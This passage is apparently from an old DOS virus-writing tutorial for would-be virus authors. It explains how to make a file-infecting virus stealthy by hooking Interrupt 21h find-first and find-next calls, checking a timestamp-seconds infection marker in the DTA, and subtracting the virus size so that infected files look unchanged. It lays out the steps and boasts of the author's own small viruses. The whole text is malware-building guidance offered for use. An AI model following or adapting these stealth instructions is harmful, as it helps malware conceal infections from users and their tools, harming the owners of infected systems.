 Some May notice that when they use PCTOOLs (aka PCSHELL) or Peter Norton  
 Utilities, or *SOME* File Managing systems like DOS-Shell, the File       
 increase of infected files is know visable. There is no doubt about       
 it, if you only put Method #1 in your virus you will encounter times      
 were the file increase shows. Its not because your Routine isn't good!    
 But due to the fact that there is another way to Read the Dir Listing     
 by DOS. An this method is Call File-find by ASCIIZ format.                
                                                                           
 We just learned how to edit File-Find by FCB. Which is used by MS-DOS     
 PC-DOS and some other programs. But unlike the others, they use the       
 ASCIIZ file-Find method as it is EASIER to open, close, edite, and any    
 other file access routine is ALOT easier with the ASCIIZ or (File Handle) 
 system. So we will make our Virus Stealth to Method #2! Making us 100%    
 Stealth from file-finds...                                                
                                                                           
 The Function we have to Intecept is Interrupt 21h, with Functions         
 AH=4Eh (Find First Matching File) and AH=4F (Find Next Matching File)     
 The Way to go about it is Very much ALIKE to the first one, so just       
 understand the thoery, and you'll be able to program it within            
 seconds.                                                                  
                                                                           
 When this function is called, it will fill the current DTA with 12        
 entries totally 43 bytes. The DTA will be set up as follows: (below)      
 BTW: DTA is only a place DOS uses to do Disk Transfer Areas! It ISN'T     
      like the FCB, or PSP that is anyways the same! You can play with     
      this as you wish. You also use this DTA to read the Command Line     
      Parameters...etc...

         Step 1. Call Dos so it fills the DTA with its findings            
         Step 2. Test for CF=1 (Carry Flag) as error happened              
                 errors happen if File not found, no more files etc...     
         Step 3. Get Seconds Field And UnMask Seconds                      
         Step 4. Check if seconds = 58 (What ever your using) Quit if NOT  
                 Notice we use `XOR  AL,1Dh' rather than `CMP   AL,1Dh'    
                 Check in your ASM Bible, which is Faster? Size?           
                 Remember speed & size is EVERYTHING, That is why          
                 My lastest are quite small viriis for stealthness!!       
         Step 5. If Infected Subtract Virus Size from File                 
         Step 6. Quit
